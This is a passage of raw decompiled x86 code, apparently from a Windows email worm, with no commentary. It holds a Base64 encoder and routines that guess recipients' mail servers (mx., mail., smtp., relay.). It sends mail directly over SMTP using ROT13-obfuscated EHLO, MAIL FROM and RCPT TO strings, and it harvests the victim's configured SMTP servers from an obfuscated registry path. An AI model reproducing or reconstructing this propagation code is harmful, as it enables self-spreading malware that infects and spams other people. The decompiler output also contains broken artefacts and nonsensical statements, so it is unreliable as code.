                004a8007: if(Vfffffff4 >= 76) {
                    004a8009: *(ebx + eax) = 13;
                    004a800d: ebx = ebx + 1;
                    004a800e: Vfffffff4 = edi;
                    004a8011: *(ebx + eax) = 10;
                    004a8015: ebx = ebx + 1;
                }
                004a8016: esi = esi + 1;
            } while(esi < 4);
            004a8023: memset( & Ac, edi, 3);
        }
        004a8034: if(esi != edi) {
            004a8039: (save) & Vfffffff8;
            004a803e: L004A807B( & Ac);
            004a8047: (restore)ecx;
            004a8048: if(esi < 3) {
                004a804a: Vfffffffb = 61;
            }
            004a8051: if(esi < 2) {
                004a8053: Vfffffffa = 61;
            }
            004a805a: esi = & Vfffffff8;
            004a805d: edi = ebx + A8;
            004a8060: ebx = ebx + 4;
            004a8063: *edi = *esi;
            004a8063: edi = edi + 4;
            004a8063: esi = esi + 4;
        }
        004a806a: *(ebx + A8) = 0;
        004a806e: *__imp__CloseHandle(Vffffffec);
        004a8074: (restore)esi;
        004a8075: eax = 0;
        004a8077: (restore)ebx;
    }
    004a8078: (restore)edi;
}

/*	Procedure: 0x004A807B - 0x004A80E4
 *	Argument size: -60
 *	Local size: 68
 *	Save regs size: 0
 */

L004A807B(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffbc;



    004a8081: (save)esi;
    004a8082: (save)edi;
    004a8083: (save)16;
    004a8085: eax = A8;
    004a8088: (restore)Ac;
    004a8089: esi = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    004a808e: edi = & Vffffffbc;
    004a8091: asm("rep movsd");
    004a8096: Ac = ( *eax & 255) >> 2;
    004a8099: *edi = *esi;
    004a8099: edi = edi + 1;
    004a8099: esi = esi + 1;
    004a809a: dl = *(ebp + Ac - 68);
    004a80a1: (restore)edi;
    004a80a2: *Ac = dl;
    004a80a4: dl = *eax;
    004a80a6: esi = *(eax + 1) & 255;
    004a80ad: edx = (edx & 3) << 4;
    004a80b3: edx = edx | esi >> 4;
    004a80b9: *(Ac + 1) = *(ebp + edx - 68);
    004a80bc: dl = *(eax + 1);
    004a80bf: esi = *(eax + 2) & 255;
    004a80c6: edx = (edx & 15) << 2;
    004a80cc: edx = edx | esi >> 6;
    004a80ce: (restore)esi;
    004a80d3: *(Ac + 2) = *(ebp + edx - 68);
    004a80d9: eax = *(eax + 2) & 63;
    004a80e0: *(Ac + 3) = *(ebp + eax - 68);
    004a80e4: return(*(Ac + 3));
}

/*	Procedure: 0x004A80E5 - 0x004A82E2
 *	Argument size: -776
 *	Local size: 784
 *	Save regs size: 0
 */

L004A80E5(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffcf0;
	/* unknown */ void  Vfffffdf0;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    004a80f2: (save)ebx;
    004a80f3: (save)esi;
    004a80f4: (save)edi;
    004a80f5: if(Ac != 0) {
        004a8119: if(L004A8346(Ac, "To", & Vfffffcf0, 256) != 0) {
            ff100555: goto L004a82db;
        }
        004a811f: cl = Vfffffcf0;
        004a8125: for(eax = & Vfffffcf0; cl != 0 && cl != 64; eax = eax + 1) {
            004a8134: cl = *(eax + 1);
        }
        004a813d: if(*eax == 0) {
            ff10055b: goto L004a82db;
        }
        004a814a: (save)eax + 1;
        004a8151: (save) & Vfffffdf0;
        004a8152: *__imp__lstrcpyA();
        004a8154: esi = A8;
        004a8157: ebx = *L004A114C;
        004a815f: do {
            004a8165: eax = L004A830B(esi + 8);
            004a816d: Vfffffff4 = eax;
            004a8170: if(eax != 0) {
                004a8172: (save)25;
                004a8174: Vfffffff0 = 2;
                004a817a: *ebx();
                004a817c: (save)Ac;
                004a817f: Vfffffff2 = ax;
                004a818f: (restore)ecx;
                004a8190: if(L004A84F2( & Vfffffff0) == 0) {
                    ff100561: goto L004a82d7;
                }
            }
            004a8196: esi = *esi;
        } while(esi != 0);
        004a819c: A8 = 0;
        004a81a0: for(esi = __imp__wsprintfA; 1; A8 = A8 + 1) {
            004a81a6: eax = A8;
            004a81ac: if(eax > 9) {
                004a8258: Vfffffef0 = 0;
            } else {
                004a81b2: goto *(eax * 4 + 0x4a82e3)[L004a81b9, L004a81ce, L004a81dc, L004a81ea, L004a81f8, L004a8206, L004a8214, L004a8222, L004a8230, L004a823e, ]goto ( *(eax * 4 + 0x4a82e3));
                004a81bf: (save) & Vfffffdf0;
                004a81c6: (save) & Vfffffef0;
                004a81c7: *edi();
            }
004a825f: L004a825f:
            004a8266: if(Vfffffef0 == 0) {
                ff100567: goto L004a82b7;
            }
            004a826f: eax = L004A830B( & Vfffffef0);
            004a8277: Vfffffff4 = eax;
            004a827a: if(eax != 0) {
                004a827c: (save)25;
                004a827e: Vfffffff0 = 2;
                004a8284: *ebx();
                004a8286: (save)Ac;
                004a8289: Vfffffff2 = ax;
                004a8299: (restore)ecx;
                004a829a: if(L004A84F2( & Vfffffff0) == 0) {
                    ff10056b: goto L004a82d7;
                }
                004a829c: L004A48BC();
                004a82a1: eax = ax & 65535;
                004a82a4: (save)100;
                004a82a6: asm("cdq");
                004a82a7: (restore)ecx;
                004a82ad: if(ecx / ecx % ecx / ecx < 20) {
                    ff10056d: goto L004a82b7;
                }
            }
        }
        004a81d4: (save) & Vfffffdf0;
        004a81d5: (save)"mx.%s";
        004a81da: goto L004a824a;
        004a81e2: (save) & Vfffffdf0;
        004a81e3: (save)"mail.%s";
        004a81e8: goto L004a824a;
        004a81f0: (save) & Vfffffdf0;
        004a81f1: (save)"smtp.%s";
        004a81f6: goto L004a824a;
        004a81fe: (save) & Vfffffdf0;
        004a81ff: (save)"mx1.%s";
        004a8204: goto L004a824a;
        004a820c: (save) & Vfffffdf0;
        004a820d: (save)"mxs.%s";
        004a8212: goto L004a824a;
        004a821a: (save) & Vfffffdf0;
        004a821b: (save)"mail1.%s";
        004a8220: goto L004a824a;
        004a8228: (save) & Vfffffdf0;
        004a8229: (save)"relay.%s";
        004a822e: goto L004a824a;
        004a8236: (save) & Vfffffdf0;
        004a8237: (save)"ns.%s";
        004a823c: goto L004a824a;
        004a8244: (save) & Vfffffdf0;
        004a8245: (save)"gate.%s";
004a824a: L004a824a:
        004a8250: (save) & Vfffffef0;
        004a8251: *esi();
        004a8253: esp = esp + 12;
        004a8256: goto L004a825f;
004a82b7: L004a82b7:
        004a82b7: L004A48BC();
        004a82bc: eax = ax & 65535;
        004a82bf: (save)100;
        004a82c1: asm("cdq");
        004a82c2: (restore)ecx;
        004a82c8: if(ecx / ecx % ecx / ecx >= 25 || L004A895A(Ac) != 0) {
            ff10056f: goto L004a82db;
        }
004a82d7: L004a82d7:
        004a82d7: eax = 0;
    } else {
004a82db: L004a82db:
        004a82dd: eax = 1;
    }
    004a82de: (restore)edi;
    004a82df: (restore)esi;
    004a82e0: (restore)ebx;
}

/*	Procedure: 0x004A82E3 - 0x004A830A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A82E3()
{



}

stack space not deallocated on return
/*	Procedure: 0x004A830B - 0x004A8345
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 8
 */

L004A830B(A14)
/* unknown */ void  A14;
{
	/* unknown */ void  esi;



    004a8311: (save)A14;
    004a8318: esi = *L004a1174();
    004a831d: if(esi != -1) {
        004a8321: if(esi != 0) {
            ff100575: goto L004a833a;
        }
        004a8326: if(*A14 == 48) {
            ff100577: goto L004a8341;
        }
    }
    004a8329: eax = *L004a1178(A14);
    004a8331: if(eax != 0) {
        004a8338: esi = *( *( *(eax + 12)));
    }
004a833a: L004a833a:
    004a833d: if(esi == -1) {
        004a833f: esi = 0;
    }
004a8341: L004a8341:
    004a8345: return(esi);
}

/*	Procedure: 0x004A8346 - 0x004A84F1
 *	Argument size: 16
 *	Local size: 256
 *	Save regs size: 8
 */

L004A8346(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff00;



    004a8351: esi = A8;
    004a8354: eax = 0;
    004a8358: (save)edi;
    004a8359: if(esi != 0 && Ac != 0 && A10 != 0 && A14 > 0) {
        004a837a: for(bl = 10; 1; esi = esi + 1) {
            004a837c: al = *esi;
            004a8380: if(al != 13 && al != bl && al != 32 && al != 9) {
                ff10058b: break;
            }
        }
        004a8394: if(*esi != 0) {
            004a839a: edi = __imp__lstrlenA;
            004a83a0: do {
                004a83a0: ecx = 0;
004a83a2: L004a83a2:
                004a83a2: do {
                    004a83a2: al = *esi;
                    004a83a4: esi = esi + 1;
                    004a83a7: if(al == 0) {
                        ff10058f: break;
                    }
                    004a83ab: if(al == 58 || al == 13 || al == bl) {
                        ff100591: goto L004a83e6;
                    }
                    004a83b7: if(al == 9) {
                        004a83b9: al = al + 23;
                    }
                    004a83bd: if(ecx <= 0 || al != 32 || *(ebp + ecx + -257) != al) {
                        004a83ce: if(ecx == 0 && al == 32) {
                            ff1005a1: goto L004a83a2;
                        }
                        004a83d4: *(ebp + ecx + -256) = al;
                        004a83db: ecx = ecx + 1;
                    }
                } while(ecx < 255);
                ff1005a4: goto L004a83e7;
004a83e6: L004a83e6:
                004a83e6: esi = esi - 1;
004a83e7: L004a83e7:
                004a83e7: *(ebp + ecx + -256) = 0;
                004a83f2: if(*esi == 0) {
                    ff1005a5: goto L004a8488;
                }
                004a83fe: (save) & Vffffff00;
                004a8409: if(*(ebp + *edi() + -257) == 32) {
                    004a8411: (save) & Vffffff00;
                    004a8414: *(ebp + *edi() + -257) = 0;
                }
                004a8423: if(Vffffff00 == 0) {
                    ff1005a9: goto L004a8488;
                }
                004a8428: if(*esi == 58) {
                    004a8431: *__imp__CharLowerA();
                    004a8449: if(*__imp__lstrcmpiA( & Vffffff00, Ac, & Vffffff00) == 0) {
                        ff1005ad: goto L004a8490;
                    }
                }
                004a844b: while(1) {
                    004a844b: al = *esi;
                    004a844f: if(al == bl || al == 13 || al == 0) {
                        ff1005af: break;
                    }
                    004a8459: esi = esi + 1;
                }
                004a845c: al = *esi;
                004a8460: if(al == 0) {
                    ff1005b5: goto L004a8488;
                }
                004a8464: if(al != bl) {
                    004a846e: if(al != 13) {
                        ff1005b9: goto L004a8476;
                    }
                    004a8470: esi = esi + 1;
                } else {
                    004a8466: esi = esi + 1;
                    004a8467: *esi :: 13;
                }
                004a8473: if(*esi == bl) {
                    004a8475: esi = esi + 1;
                }
004a8476: L004a8476:
                004a8476: al = *esi;
                004a847a: if(al == bl || al == 13) {
                    ff1005bd: goto L004a8488;
                }
            } while(al != 0);
        }
    }
004a8488: L004a8488:
    004a848a: eax = 1;
004a848b: L004a848b:
    004a848b: (restore)edi;
    004a848f: return;
004a8490: L004a8490:
    004a8490: al = *(esi + 1);
    004a8493: esi = esi + 1;
    004a8496: if(al == 32 || al == 9) {
        004a849c: esi = esi + 1;
    }
    004a84a0: edx = 0;
    004a84a2: edi = A14 - 1;
    004a84a7: if(edi > 0) {
        004a84a9: do {
            004a84a9: al = *esi;
            004a84ab: esi = esi + 1;
            004a84ae: if(al == 13 || al == bl) {
                004a84ca: eax = esi;
                004a84cc: for(esi = esi - 1; 1; eax = eax + 1) {
                    004a84cd: cl = *eax;
                    004a84d1: if(cl != bl && cl != 13) {
                        ff1005d1: break;
                    }
                }
                004a84db: al = *eax;
                004a84df: if(al != 32 && al != 9) {
                    ff1005d5: break;
                }
                004a84e5: while(1) {
                    004a84e5: al = *esi;
                    004a84e9: if(al != bl && al != 13) {
                        ff1005d9: goto L004a84bb;
                    }
                    004a84ef: esi = esi + 1;
                }
                004a84e6: goto L004a84e6;
            }
            004a84b7: *(edx + A10) = al;
            004a84ba: edx = edx + 1;
004a84bb: L004a84bb:
        } while(edx < edi);
    }
    004a84c2: *(edx + A10) = 0;
    004a84c6: eax = 0;
    004a84c8: goto L004a848b;
}

/*	Procedure: 0x004A84F2 - 0x004A87A3
 *	Argument size: 8
 *	Local size: 1028
 *	Save regs size: 8
 */

L004A84F2(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffcfc;
	/* unknown */ void  Vfffffdfc;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vfffffffc;



    004a84fd: esi = 256;
    004a851c: if(L004A8346(Ac, "From", & Vfffffdfc, 256) == 0 && L004A8346(Ac, "To", & Vfffffbfc, esi) == 0) {
        004a853a: cl = Vfffffdfc;
        004a8540: for(eax = & Vfffffdfc; cl != 0 && cl != 64; eax = eax + 1) {
            004a854f: cl = *(eax + 1);
        }
        004a8558: if(*eax != 0) {
            004a855b: (save)eax + 1;
            004a8562: (save) & Vfffffcfc;
            004a8563: *__imp__lstrcpyA();
            004a8569: (save)6;
            004a856b: (save)1;
            004a856d: (save)2;
            004a8575: ebx = *L004a1148();
            004a857a: Vfffffffc = ebx;
            004a857d: if(ebx != -1) {
                ff1005e5: goto L004a8587;
            }
        }
    }
    004a8581: eax = 1;
    004a8582: goto L004a87a0;
004a8587: L004a8587:
    004a8587: (save)edi;
    004a8588: (save)16;
    004a858a: (save)A8;
    004a858d: (save)ebx;
    004a8596: if(*L004a1150() == 0) {
        004a859c: esi = 15000;
        004a85a1: (save)15000;
        004a85a3: eax = L004A87A4(ebx);
        004a85ab: (restore)ecx;
        004a85ac: if(eax == 0) {
            004a85b5: eax = L004A8804(ebx, esi, eax);
            004a85ba: esi = 200;
            004a85c4: if(eax >= 200 && eax < 400) {
                004a85e1: L004A471C( & Vfffffefc, "RUYB %f\r\n");
                004a85ec: edi = 10000;
                004a85f1: (save) & Vfffffcfc;
                004a85f8: (save) & Vfffffefc;
                004a85f9: (save)10000;
                004a85fa: (save)ebx;
                004a85fb: eax = L004A8804();
                004a8600: esp = esp + 24;
                004a8605: if(eax >= esi && eax <= 299) {
                    ff1005f1: goto L004a864a;
                }
                004a861a: L004A471C( & Vfffffefc, "URYB %f\r\n");
                004a8625: (save) & Vfffffcfc;
                004a862c: (save) & Vfffffefc;
                004a862d: (save)edi;
                004a862e: (save)ebx;
                004a862f: eax = L004A8804();
                004a8634: esp = esp + 24;
                004a8639: if(eax >= esi && eax <= 299) {
004a864a: L004a864a:
                    004a8656: L004A471C( & Vfffffefc, "ZNVY SEBZ:<%f>\r\n");
                    004a8661: (save) & Vfffffdfc;
                    004a8668: (save) & Vfffffefc;
                    004a8669: (save)edi;
                    004a866a: (save)ebx;
                    004a866b: eax = L004A8804();
                    004a8670: esp = esp + 24;
                    004a8675: if(eax >= esi && eax <= 299) {
                        004a8692: L004A471C( & Vfffffefc, "EPCG GB:<%f>\r\n");
                        004a869d: (save) & Vfffffbfc;
                        004a86a4: (save) & Vfffffefc;
                        004a86a5: (save)edi;
                        004a86a6: (save)ebx;
                        004a86a7: eax = L004A8804();
                        004a86ac: esp = esp + 24;
                        004a86b1: if(eax >= esi && eax <= 299) {
                            004a86c9: eax = L004A8804(ebx, edi, "DATA\r\n");
                            004a86d3: if(eax >= esi && eax <= 399) {
                                004a86e4: ecx = Ac;
                                004a86e7: edi = *L004A1168;
                                004a86ed: for(Ac = ecx; 1; ecx = ebx) {
                                    004a86f0: dl = *ecx;
                                    004a86f2: ebx = ecx;
                                    004a86f6: if(dl != 0) {
                                        004a86f8: al = dl;
                                        004a86fa: do {
                                            004a86fc: if(al == 10 || al == 13) {
                                                ff100605: break;
                                            }
                                            004a8702: al = *(ebx + 1);
                                            004a8705: ebx = ebx + 1;
                                        } while(al != 0);
                                    }
                                    004a870a: while(1) {
                                        004a870a: al = *ebx;
                                        004a870e: if(al != 10 && al != 13) {
                                            ff10060d: break;
                                        }
                                        004a8714: ebx = ebx + 1;
                                    }
                                    004a8719: if(ecx == ebx) {
                                        ff10060f: break;
                                    }
                                    004a871e: if(dl == 46) {
                                        004a8720: (save)0;
                                        004a8722: (save)1;
                                        004a8724: (save)".";
                                        004a8729: (save)Vfffffffc;
                                        004a872c: *edi();
                                        004a872e: ecx = Ac;
                                    }
                                    004a8733: (save)0;
                                    004a8737: (save)ebx - ecx;
                                    004a8738: (save)ecx;
                                    004a8739: (save)Vfffffffc;
                                    004a8740: if(*edi() <= 0) {
                                        ff100613: goto L004a8790;
                                    }
                                    004a8742: Ac = ebx;
                                }
                                004a8749: (save)0;
                                004a874b: (save)5;
                                004a874d: (save)"\r\n.\r\n";
                                004a8752: (save)Vfffffffc;
                                004a8755: *edi();
                                004a8761: eax = L004A8804(Vfffffffc, 15000, 0);
                                004a876b: if(eax >= esi && eax < 400) {
                                    004a8781: L004A8804(Vfffffffc, 5000, "QUIT\r\n");
                                    004a8786: ebx = Vfffffffc;
                                    004a878c: esi = 0;
                                    004a878e: goto L004a8796;
                                }
004a8790: L004a8790:
                                004a8790: ebx = Vfffffffc;
                            }
                        }
                    }
                }
            }
        }
    }
    004a8795: esi = 1;
004a8796: L004a8796:
    004a8797: *L004a115c(ebx);
    004a879d: eax = esi;
    004a879f: (restore)edi;
004a87a0: L004a87a0:
}

/*	Procedure: 0x004A87A4 - 0x004A8803
 *	Argument size: -260
 *	Local size: 268
 *	Save regs size: 0
 */

L004A87A4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffef4;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a87b6: edx = 0;
    004a87ba: Vfffffef4 = 1;
    004a87c4: edx = 1000 / 1000 % 1000 / 1000;
    004a87c6: edx = 0;
    004a87c8: Vfffffff8 = Ac;
    004a87cb: eax = Ac;
    004a87ce: edx = 1000 / 1000 % 1000 / 1000;
    004a87d9: Vfffffef8 = A8;
    004a87e9: 1000 = edx * edx;
    004a87ef: Vfffffffc = edx;
    004a87f2: eax = *L004a1144(0, & Vfffffef4, 0, 0, & Vfffffff8, esi);
    004a87f8: ecx = 0;
    004a87fa: (restore)esi;
    004a87fb: eax :: 0;
    004a87fd: asm("setng cl");
    004a8803: return(ecx);
}

/*	Procedure: 0x004A8804 - 0x004A88A5
 *	Argument size: -1008
 *	Local size: 1024
 *	Save regs size: 0
 */

L004A8804(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vfffffc00;



    004a8811: if(A10 != 0) {
        004a8816: (save) & A14;
        004a881d: (save)A10;
        004a8820: (save) & Vfffffc00;
        004a8821: *__imp__wvsprintfA();
        004a882d: (save)0;
        004a882f: (save) & Vfffffc00;
        004a8836: (save) *__imp__lstrlenA();
        004a883d: (save) & Vfffffc00;
        004a883e: (save)A8;
        004a8841: *L004a1168();
    }
    004a8847: (save)esi;
    004a8848: esi = 1024;
    004a884d: for((save)Ac; 1; (save)Ac) {
        004a8856: (save)esi;
        004a8857: (save) & Vfffffc00;
        004a8858: (save)A8;
        004a8860: esp = esp + 16;
        004a8865: if(L004A88A6() <= 0) {
            ff10061b: break;
        }
        004a8867: ecx = & Vfffffc00;
        004a886d: for(eax = 0; 1; ecx = ecx + 1) {
            004a886f: dl = *ecx;
            004a8874: if(dl != 32 && dl != 9) {
                ff10061f: break;
            }
        }
        004a887e: while(1) {
            004a887e: dl = *ecx;
            004a8883: if(dl < 48 || dl > 57) {
                ff100621: break;
            }
            004a888a: edx = dl;
            004a888d: eax = eax + eax * 4;
            004a8890: ecx = ecx + 1;
            004a8891: eax = edx + eax * 2 - 48;
        }
        004a889a: if(*ecx != 45) {
            ff100625: goto L004a88a3;
        }
    }
    004a88a1: eax = 0;
004a88a3: L004a88a3:
    004a88a3: (restore)esi;
}

/*	Procedure: 0x004A88A6 - 0x004A8959
 *	Argument size: -264
 *	Local size: 280
 *	Save regs size: 0
 */

L004A88A6(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vfffffee8;
	/* unknown */ void  Vfffffeec;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a88af: Vfffffffc = 0;
    004a88b3: (save)A8;
    004a88b4: (save)edi;
    004a88b7: edi = 1;
    004a88bb: if(A10 > 1) {
        004a88c1: eax = Ac;
        004a88c7: Vfffffff4 = 1;
        004a88ca: Vfffffff8 = eax;
        004a88cd: Vfffffff4 = Vfffffff4 - Vfffffff8;
        004a88d0: do {
            004a88d0: eax = A14;
            004a88d5: if(eax != 0) {
                004a88d7: edx = 0;
                004a88de: ecx = 1000 / 1000;
                004a88de: edx = ecx % ecx;
                004a88e0: edx = 0;
                004a88e2: Vfffffeec = A8;
                004a88e8: Vfffffee8 = edi;
                004a88ee: Vffffffec = eax;
                004a88f1: eax = A14;
                004a88f4: edx = ecx / ecx % ecx / ecx;
                004a88ff: (save) & Vffffffec;
                004a8902: (save)0;
                004a8903: (save)0;
                004a8904: (save) & Vfffffee8;
                004a8905: (save)0;
                004a8906: 1000 = edx * edx;
                004a890c: Vfffffff0 = edx;
                004a8917: if(*L004a1144() <= 0) {
                    ff10062b: break;
                }
            }
            004a8920: eax = *L004a1154(A8, Vfffffff8, edi, 0);
            004a8928: if(eax < 0) {
                ff10062d: goto L004a8955;
            }
            004a892a: == ? L004a8947 : ;
            004a892c: eax = Vfffffff8;
            004a892f: Vfffffffc = Vfffffffc + 1;
            004a8932: cl = *eax;
            004a8934: eax = eax + 1;
            004a8938: Vfffffff8 = eax;
            004a893b: if(cl == 10) {
                ff10062f: break;
            }
        } while(Vfffffff4 + eax < A10);
    }
    004a894a: eax = Vfffffffc;
    004a894d: *(eax + Ac) = 0;
004a8951: L004a8951:
    004a8951: (restore)edi;
    004a8952: (restore)A8;
    004a8954: return;
004a8955: L004a8955:
    004a8955: eax = eax | -1;
    004a8958: goto L004a8951;
}

/*	Procedure: 0x004A895A - 0x004A8AB1
 *	Argument size: 4
 *	Local size: 804
 *	Save regs size: 4
 */

L004A895A(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffcdc;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffedc;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffde;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a8970: L004A471C( & Vfffffedc, "Fbsgjner\Zvpebfbsg\Vagrearg Nppbhag Znantre\Nppbhagf");
    004a8981: L004A471C( & Vffffff5c, "FZGC Freire");
    004a898c: ebx = 0;
    004a898e: (save) & Vfffffffc;
    004a898f: (save)131097;
    004a899a: (save)0;
    004a899b: (save) & Vfffffedc;
    004a899c: (save)-2147483647;
    004a89a9: if(*__imp__RegOpenKeyExA() != 0) {
        004a89ad: eax = 1;
    } else {
        004a89b3: (save)esi;
        004a89b4: esi = 256;
        004a89b9: (save)edi;
        004a89ba: edi = __imp__RegEnumKeyA;
        004a89c6: (save)256;
        004a89c7: (save) & Vfffffcdc;
        004a89c8: (save)ebx;
        004a89c9: (save)Vfffffffc;
        004a89cc: Vfffffff4 = ebx;
        004a89cf: for(Vfffffff8 = 1; *edi() == 0; (save)Vfffffffc) {
            004a89e3: (save) & Vfffffff0;
            004a89e4: (save)131097;
            004a89ef: (save)ebx;
            004a89f0: (save) & Vfffffcdc;
            004a89f1: (save)Vfffffffc;
            004a89fc: if(*__imp__RegOpenKeyExA() == 0) {
                004a8a0b: memset( & Vfffffddc, ebx, esi);
                004a8a16: Vffffffec = esi;
                004a8a19: (save) & Vffffffec;
                004a8a20: (save) & Vfffffddc;
                004a8a21: (save)ebx;
                004a8a28: (save)ebx;
                004a8a29: (save) & Vffffff5c;
                004a8a2a: (save)Vfffffff0;
                004a8a35: if(*__imp__RegQueryValueExA() == 0) {
                    004a8a3e: eax = L004A830B( & Vfffffddc);
                    004a8a46: Vffffffe0 = eax;
                    004a8a49: if(eax != ebx) {
                        004a8a4b: (save)25;
                        004a8a4d: Vffffffdc = 2;
                        004a8a53: *L004a114c();
                        004a8a59: (save)A8;
                        004a8a5c: Vffffffde = ax;
                        004a8a6c: (restore)ecx;
                        004a8a6d: if(L004A84F2( & Vffffffdc) == 0) {
                            004a8a6f: Vfffffff4 = 1;
                        }
                    }
                }
                004a8a76: (save)Vfffffff0;
                004a8a79: *__imp__RegCloseKey();
                004a8a82: if(Vfffffff4 != ebx) {
                    ff10063f: break;
                }
            }
            004a8a84: eax = Vfffffff8;
            004a8a87: Vfffffff8 = Vfffffff8 + 1;
            004a8a90: (save)esi;
            004a8a91: (save) & Vfffffcdc;
            004a8a92: (save)eax;
        }
        004a8a9e: *__imp__RegCloseKey(Vfffffffc);
        004a8aa9: (restore)edi;
        004a8aaa: (restore)esi;
        004a8aab: 0 = 0;
    }
    004a8ab0: return;
    004a8ab1: asm("int3");
}

/* DEST BLOCK NOT FOUND: 004a8ab2 -> 004a89d6 */
/*	Procedure: 0x004A8AB2 - 0x004A8AB7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A8AB2()
{



    004a8ab2: goto ( *L004a116c);
}

/* DEST BLOCK NOT FOUND: 004a8ab8 -> 004a89d6 */
/*	Procedure: 0x004A8AB8 - 0x004A8ABD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

memset()
{



    004a8ab8: goto ( *__imp__memset);
}

/* DEST BLOCK NOT FOUND: 004a8abe -> 004a89d6 */
/*	Procedure: 0x004A8ABE - 0x004A8ACF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

memcpy()
{



    004a8abe: goto ( *__imp__memcpy);
    004a8ac4: asm("int3");
    004a8ac5: asm("int3");
    004a8ac6: asm("int3");
    004a8ac7: asm("int3");
    004a8ac8: asm("int3");
    004a8ac9: asm("int3");
    004a8aca: asm("int3");
    004a8acb: asm("int3");
    004a8acc: asm("int3");
    004a8acd: asm("int3");
    004a8ace: asm("int3");
    004a8acf: asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x004A8AD0 - 0x004A8AFE
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A8AD0(A8)
/* unknown */ void  A8;
{



    004a8ad0: (save)ecx;
    004a8ad6: ecx = & A8;
    004a8ada: do {
        004a8adc: ecx = ecx - 4096;
        004a8ae2: eax = eax - 4096;
        004a8ae7: *ecx & eax;
    } while(eax >= 4096);
    004a8af0: ecx = ecx - eax;
    004a8af2: eax = esp;
    004a8af4: *ecx & eax;
    004a8af6: esp = ecx;
    004a8af8: ecx = *eax;
    004a8afa: eax = *(eax + 4);
    004a8afd: (save)eax;
}

/*	Procedure: 0x004A8AFF - 0x004A8AFF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A8AFF()
{



    004a8aff: asm("int3");
}

/* address  size  */
/* 0x004a1000       0 */ /* unknown */ void 	__imp__RegEnumKeyA;
/* 0x004a1004       0 */ /* unknown */ void 	__imp__RegQueryValueExA;
/* 0x004a1008       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x004a100c       0 */ /* unknown */ void 	__imp__RegOpenKeyExA;
/* 0x004a1010       0 */ /* unknown */ void 	__imp__RegCreateKeyExA;
/* 0x004a1014       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x004a101c       0 */ /* unknown */ void 	__imp__FileTimeToSystemTime;
/* 0x004a1020       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x004a1024       0 */ /* unknown */ void 	__imp__WideCharToMultiByte;
/* 0x004a1028       0 */ /* unknown */ void 	__imp__SystemTimeToFileTime;
/* 0x004a102c       0 */ /* unknown */ void 	__imp__GetTempFileNameA;
/* 0x004a1030       0 */ /* unknown */ void 	__imp__GlobalAlloc;
/* 0x004a1034       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x004a1038       0 */ /* unknown */ void 	__imp__SetFilePointer;
/* 0x004a103c       0 */ /* unknown */ void 	__imp__GetCurrentThread;
/* 0x004a1040       0 */ /* unknown */ void 	__imp__SetThreadPriority;
/* 0x004a1044       0 */ /* unknown */ void 	__imp__GetDriveTypeA;
/* 0x004a1048       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x004a104c       0 */ /* unknown */ void 	__imp__CreateFileMappingA;
/* 0x004a1050       0 */ /* unknown */ void 	__imp__MapViewOfFile;
/* 0x004a1054       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x004a1058       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x004a105c       0 */ /* unknown */ void 	__imp__lstrcpyA;
/* 0x004a1060       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x004a1064       0 */ /* unknown */ void 	__imp__GetFileAttributesA;
/* 0x004a1068       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x004a106c       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x004a1070       0 */ /* unknown */ void 	__imp__GetTempPathA;
/* 0x004a1074       0 */ /* unknown */ void 	__imp__GetSystemDirectoryA;
/* 0x004a1078       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x004a107c       0 */ /* unknown */ void 	__imp__GetLastError;
